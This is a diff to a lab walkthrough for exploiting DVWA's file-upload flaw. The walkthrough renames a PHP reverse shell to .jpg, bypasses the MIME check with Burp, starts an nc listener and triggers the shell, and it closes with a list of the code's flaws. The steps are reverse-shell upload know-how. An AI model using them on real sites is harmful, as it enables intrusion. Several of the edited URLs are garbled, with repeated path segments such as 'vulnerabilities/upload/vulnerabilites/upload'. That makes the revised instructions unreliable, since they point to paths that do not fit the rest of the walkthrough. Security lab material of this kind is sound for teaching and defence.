@@ -16,7 +16,7 @@
 
 4. Navigate to DVWA and set difficulty to medium 
 
-    - http://<ip address>/dvwa
+    - http://localhost/dvwa/vulnerabilities/upload
     - Login
     ```bash 
     admin
@@ -26,15 +26,11 @@
     - Set security level to medium
 
 5. Navigate to the target webpage 
-    - http://<ip address>/dvwa/vulnerabilites/upload
+    - http://localhost/dvwa/vulnerabilities/upload/vulnerabilites/upload
 
 6. Make a copy of `php_reverse_shell.php` and save as a jpg file:
 
-    - `CTRL + ATL + T` to open a terminal 
-
-    ```bash 
-    sudo cp /usr/share/webshells/php/php_reverse_shell.php php_reverse_shell.jpg
-    ```
+    - Manually copy php_reverse_shell.php and rename it to .jpg using File Explorer
 
 7. Prepare for upload:
     
@@ -67,10 +63,10 @@
 
     - Turn intercept off
 
-12. On the kali terminal start a listener 
+12. In a powershell terminal start a listener 
 
     ```bash 
-    nc -lvnp 1234 # If you changed the port number in the webshell file then change it here 
+    nc.exe -lvnp 1234 # If you changed the port number in the webshell file then change it here 
     # l - listener mode
     # v - verbose output 
     # n - skip DNS resolution (faster) 
@@ -79,9 +75,9 @@
 
 13. Navigate to the uploaded webshell 
 
-    - The uploaded file was saved to http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php
+    - The uploaded file was saved to http://localhost/dvwa/vulnerabilities/upload/hackable/upload/php-reverse-shell.php
 
-    - Alternatively run `curl -s http://<ip address>/dvwa/hackable/upload/php-reverse-shell.php` in another terminal 
+    - Alternatively run `Invoke-WebRequest -Uri http://localhost/dvwa/vulnerabilities/upload/hackable/upload/php-reverse-shell.php -UseBasicParsing` in Powershell
 
 14. On the netcat listener look a connection
     
@@ -98,7 +94,7 @@
 
 
 ### File 
-`/var/www/dvwa/vulnerabilities/upload/source/medium`
+`C:\xampp\htdocs\DVWA\vulnerabilities\upload\source\medium.php`
 
 #### Key Vulnerability Points:
 
@@ -174,13 +170,9 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 - Causes
 
     - **MIME type check is weak and can be spoofed:** The script relies on the MIME type sent by the client, which attackers can manipulate e.g using Burp Suite
-
     - **Filename not sanitised:** Using `basename()` only strips directory paths but does not prevent dangerous filenames or double extensions (e.g., `shell.php.jpg`).
-
     - **No verification of file content:** The script does not check if the file is actually a valid image (e.g., via `getimagesize()`), so malicious files can be disguised as images.
-
     - **Uploads saved in a web-accessible directory:** Uploaded files can be accessed and potentially executed by visiting their URL.
-
     - **No filename randomisation:** This can lead to file overwriting or easier targeting by attackers.
 
 
